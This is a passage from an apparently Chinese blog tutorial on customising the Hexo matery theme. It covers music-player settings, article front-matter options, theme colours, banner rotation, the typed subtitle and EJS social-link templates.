  <span class="token key atrule">server</span><span class="token punctuation">:</span> netease   <span class="token comment" spellcheck="true">#require    music platform: netease, tencent, kugou, xiami, baidu</span>
  <span class="token key atrule">type</span><span class="token punctuation">:</span> playlist    <span class="token comment" spellcheck="true">#require song, playlist, album, search, artist</span>
  <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">2888085740     </span><span class="token comment" spellcheck="true">#require    song id / playlist id / album id / search keyword</span>
  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false       </span><span class="token comment" spellcheck="true"># 开启吸底模式</span>
  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false   </span><span class="token comment" spellcheck="true"># 是否自动播放</span>
  <span class="token key atrule">theme</span><span class="token punctuation">:</span> '<span class="token comment" spellcheck="true">#42b983'</span>
  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span>       <span class="token comment" spellcheck="true"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>
  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'random'</span>   <span class="token comment" spellcheck="true"># 音频循环顺序, 可选值: 'list', 'random'</span>
  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span>   <span class="token comment" spellcheck="true"># 预加载，可选值: 'none', 'metadata', 'auto'</span>
  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7       </span><span class="token comment" spellcheck="true"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>
  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">true  </span><span class="token comment" spellcheck="true"># 列表默认折叠</span>
  <span class="token key atrule">hideLrc</span><span class="token punctuation">:</span> <span class="token boolean important">true     </span><span class="token comment" spellcheck="true"># 隐藏歌词</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>server 可选 netease（网易云音乐），tencent（QQ 音乐），kugou（酷狗音乐），xiami（虾米音乐），</p>
<p>baidu（百度音乐）。</p>
<p>type 可选 song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）</p>
<p>id 获取示例：浏览器打开网易云音乐，点击我喜欢的音乐歌单，地址栏有一串数字，playlist 的 id 即为这串数字。</p>
</blockquote>
<h3 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h3><table>
<thead>
<tr>
<th align="center">配置选项</th>
<th align="center">默认值</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">title</td>
<td align="center">Markdown 的文件标题</td>
<td align="center">文章标题，强烈建议填写此选项</td>
</tr>
<tr>
<td align="center">date</td>
<td align="center">文件创建时的日期时间</td>
<td align="center">发布时间，强烈建议填写此选项，且最好保证全局唯一</td>
</tr>
<tr>
<td align="center">author</td>
<td align="center">根 _config.yml 中的 author</td>
<td align="center">文章作者</td>
</tr>
<tr>
<td align="center">img</td>
<td align="center">featureImages 中的某个值</td>
<td align="center">文章特征图，推荐使用图床</td>
</tr>
<tr>
<td align="center">top</td>
<td align="center">true</td>
<td align="center">推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td>
</tr>
<tr>
<td align="center">cover</td>
<td align="center">false</td>
<td align="center">v1.0.2 版本新增，表示该文章是否需要加入到首页轮播封面中</td>
</tr>
<tr>
<td align="center">coverImg</td>
<td align="center">无</td>
<td align="center">v1.0.2 版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td>
</tr>
<tr>
<td align="center">password</td>
<td align="center">无</td>
<td align="center">文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td>
</tr>
<tr>
<td align="center">toc</td>
<td align="center">true</td>
<td align="center">是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td>
</tr>
<tr>
<td align="center">mathjax</td>
<td align="center">false</td>
<td align="center">是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td>
</tr>
<tr>
<td align="center">summary</td>
<td align="center">无</td>
<td align="center">文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td>
</tr>
<tr>
<td align="center">categories</td>
<td align="center">无</td>
<td align="center">文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td>
</tr>
<tr>
<td align="center">tags</td>
<td align="center">无</td>
<td align="center">文章标签，一篇文章可以多个标签</td>
</tr>
<tr>
<td align="center">reprintPolicy</td>
<td align="center">cc_by</td>
<td align="center">文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td>
</tr>
</tbody></table>
<blockquote>
<p>注意:</p>
<ol>
<li><strong>如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。</strong></li>
<li>date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。</li>
<li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。</li>
<li>您可以在文章 md 文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li>
</ol>
</blockquote>
<h4 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h4><pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: typora-vue-theme主题介绍
date: 2018-09-07 09:25:00
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h4><pre class="line-numbers language-front-matter"><code class="language-front-matter">---
title: typora-vue-theme主题介绍
date: 2018-09-07 09:25:00
author: 赵奇
img: /source/images/xxx.jpg
top: true
cover: true
coverImg: /images/1.jpg
password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
toc: false
mathjax: false
summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
categories: Markdown
tags:
  - Typora
  - Markdown
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h3><h4 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h4><p>在主题文件的 /source/css/matery.css 文件中修改</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span>
<span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>
    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#2558FF</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">/*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/</span>
<span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>
   <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span>
<span class="token punctuation">}</span>
<span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="**修改 banner 图和文章特色图"></a>**修改 banner 图和文章特色图</h4><p>在 /source/medias/banner 文件夹中更换你喜欢的 banner 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 JavaScript 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 /layout/_partial/bg-cover-content.ejs 文件的 代码中：</p>
<pre class="line-numbers language-html"><code class="language-html">$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在 /source/medias/featureimages 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 _config.yml 做同步修改。</p>
<p>如果想改为每小时或者每分钟切换 banner 图的话，需要将 getDay() 改为 getHours() 或者 getMinutes() 即可。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121164729.png" alt="image-20210121164726675"></p>
<p>修改文章特色图见front_matter</p>
<h4 id="修改网站相关信息"><a href="#修改网站相关信息" class="headerlink" title="修改网站相关信息"></a>修改网站相关信息</h4><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210121164746.png" alt=""></p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true">#这是根目录下的配置文件信息</span>
<span class="token comment" spellcheck="true"># Site</span>
<span class="token key atrule">title</span><span class="token punctuation">:</span> xxxxx        <span class="token comment" spellcheck="true">#网站标题</span>
<span class="token key atrule">subtitle</span><span class="token punctuation">:</span> 世界很暗，但是你来了 <span class="token comment" spellcheck="true">#网站副标题</span>
<span class="token key atrule">description</span><span class="token punctuation">:</span> 本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。    <span class="token comment" spellcheck="true">#网站描述description 主要用于5E0，告诉搜索引擎一个关于您站点的简单描述</span>
<span class="token key atrule">keywords</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>HTML<span class="token punctuation">,</span> CSS<span class="token punctuation">,</span> JavaScript<span class="token punctuation">,</span> JQuery<span class="token punctuation">,</span> java<span class="token punctuation">,</span> linux等<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#网站的关键词。使用半角逗号“，”分隔多个关键词</span>
<span class="token key atrule">author</span><span class="token punctuation">:</span> xxx            <span class="token comment" spellcheck="true">#您的名字</span>
<span class="token key atrule">language</span><span class="token punctuation">:</span> zh<span class="token punctuation">-</span>CN            <span class="token comment" spellcheck="true">#网站使用的语言。建议修改为zh-CN</span>
<span class="token key atrule">timezone</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#网站时区。Hexo默认使用您电脑的时区。</span>


<span class="token comment" spellcheck="true"># 这是主题配置文件的相关信息</span>
<span class="token comment" spellcheck="true"># 配置网站favicon和网站LOGO</span>
<span class="token comment" spellcheck="true"># 此处我用的CDN，也可以使用本地文件</span>
<span class="token key atrule">favicon</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//cdn.jsdelivr.net/gh/guixinchn/image/blog/favicon.png
<span class="token key atrule">logo</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//cdn.jsdelivr.net/gh/guixinchn/image/blog/logo.png


<span class="token comment" spellcheck="true"># 网站副标题，打字效果</span>
<span class="token comment" spellcheck="true"># 如果有符号 ‘ ，请在 ’ 前面加上 \</span>
<span class="token key atrule">subtitle</span><span class="token punctuation">:</span>
  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># 是否循环</span>
  <span class="token key atrule">showCursor</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># 是否显示光标</span>
  <span class="token key atrule">startDelay</span><span class="token punctuation">:</span> <span class="token number">300 </span><span class="token comment" spellcheck="true"># 开始延迟</span>
  <span class="token key atrule">typeSpeed</span><span class="token punctuation">:</span> <span class="token number">100 </span><span class="token comment" spellcheck="true"># 打字速度</span>
  <span class="token key atrule">backSpeed</span><span class="token punctuation">:</span> <span class="token number">50 </span><span class="token comment" spellcheck="true"># 删除速度</span>
  <span class="token key atrule">sub1</span><span class="token punctuation">:</span> 如果放弃太早，你永远都不知道自己会错过什么。
  <span class="token key atrule">sub2</span><span class="token punctuation">:</span> 没有伞的孩子必须努力奔跑！
  <span class="token key atrule">sub3</span><span class="token punctuation">:</span> 花开不是为了花落，而是为了开的更加灿烂。
  <span class="token key atrule">sub4</span><span class="token punctuation">:</span> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：</p>
<p>网站打字效果副标题默认有两个，即 sub1 和 sub2，如果想写多个，则需要修改两处地方，首先修改配置文件，如上面所示，在 sub1 和 sub2 后面继续添加即可，然后在去主题目录下的 layout 文件夹下的_partial 文件夹，修改 bg-cover-content.ejs 文件，大约在 12 行左右，如下面所示：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description center-align<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.subtitle.enable)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>subtitle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/typed.js@2.0.11<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
                    <span class="token keyword">var</span> typed <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typed</span><span class="token punctuation">(</span><span class="token string">"#subtitle"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
                        strings<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'&lt;%= theme.subtitle.sub1 %>'</span><span class="token punctuation">,</span>
                                   <span class="token string">'&lt;%= theme.subtitle.sub2 %>'</span><span class="token punctuation">,</span>
                                  <span class="token string">'&lt;%= theme.subtitle.sub3 %>'</span><span class="token punctuation">,</span>
                                   <span class="token string">'&lt;%= theme.subtitle.sub4 %>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                        startDelay<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>subtitle<span class="token punctuation">.</span>startDelay <span class="token operator">%</span><span class="token operator">></span><span class="token punctuation">,</span>
                        typeSpeed<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>subtitle<span class="token punctuation">.</span>typeSpeed <span class="token operator">%</span><span class="token operator">></span><span class="token punctuation">,</span>
                        loop<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>subtitle<span class="token punctuation">.</span>loop <span class="token operator">%</span><span class="token operator">></span><span class="token punctuation">,</span>
                        backSpeed<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>subtitle<span class="token punctuation">.</span>backSpeed <span class="token operator">%</span><span class="token operator">></span><span class="token punctuation">,</span>
                        showCursor<span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">=</span> theme<span class="token punctuation">.</span>subtitle<span class="token punctuation">.</span>showCursor <span class="token operator">%</span><span class="token operator">></span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">else</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
                    &lt;%= config.description %>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>社交链接的修改</strong></p>
<p>在主题的配置文件中修改：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 首页 banner 中的第二行个人信息配置，留空即不启用</span>
<span class="token key atrule">socialLink</span><span class="token punctuation">:</span>
  <span class="token key atrule">qq</span><span class="token punctuation">:</span> <span class="token number">1563972718</span>
  <span class="token key atrule">weixin</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//gitee.com/marmalade0/images/blob/master/www.marmalade.vip/wechat.jpg
  <span class="token key atrule">github</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#https://github.com/marmalade0</span>
  <span class="token key atrule">email</span><span class="token punctuation">:</span> 1563972718@qq.com
  <span class="token key atrule">facebook</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># https://www.facebook.com/xxx</span>
  <span class="token key atrule">twitter</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># https://twitter.com/xxx</span>
  <span class="token key atrule">weibo</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># https://weibo.com/xxx</span>
  <span class="token key atrule">zhihu</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># https://www.zhihu.com/xxx</span>
  <span class="token key atrule">csdn</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//blog.csdn.net/kuashijidexibao
  <span class="token key atrule">cnblogs</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//www.cnblogs.com/kuashijidexibao
  <span class="token key atrule">rss</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># true、false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>期中的 weixin 我是用的图片链接，会跳转到一个新的标签页，之后还需要修改 ejs 文件，文件在主题目录下的 layout 文件夹下的_partial 文件夹，修改 social-link.ejs，添加相关的配置，比如：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.github)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.github %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.email)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:&lt;%<span class="token punctuation">=</span> theme.socialLink.email %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>邮件联系我<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fas fa-envelope-open<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.facebook)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.facebook %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的Facebook: &lt;%<span class="token punctuation">=</span> theme.socialLink.facebook %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-facebook-f<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.twitter)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.twitter %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>关注我的Twitter: &lt;%<span class="token punctuation">=</span> theme.socialLink.twitter %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fab fa-twitter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.qq)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tencent://AddContact/?fromId<span class="token punctuation">=</span>50&amp;fromSubId<span class="token punctuation">=</span>1&amp;subcmd<span class="token punctuation">=</span>all&amp;uin<span class="token punctuation">=</span>&lt;%<span class="token punctuation">=</span> theme.socialLink.qq %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>QQ联系我: &lt;%<span class="token punctuation">=</span> theme.socialLink.qq %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
